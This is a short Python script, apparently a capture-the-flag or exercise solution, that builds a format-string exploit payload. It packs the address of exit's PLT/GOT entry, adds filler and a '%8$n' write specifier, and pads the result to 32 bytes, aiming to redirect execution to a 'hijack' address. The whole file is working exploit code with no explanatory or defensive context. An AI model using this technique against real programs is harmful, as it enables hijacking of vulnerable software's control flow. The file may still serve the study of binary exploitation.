import struct

hijack = 0x401196
EXIT_PLT = 0x00404050

def pad(s):
    return s+"X"*(32-len(s))

exploit = ""
exploit += struct.pack("I",EXIT_PLT)
exploit += "AAAA"
exploit += "%8$n "
exploit += "\0"

print(pad(exploit))
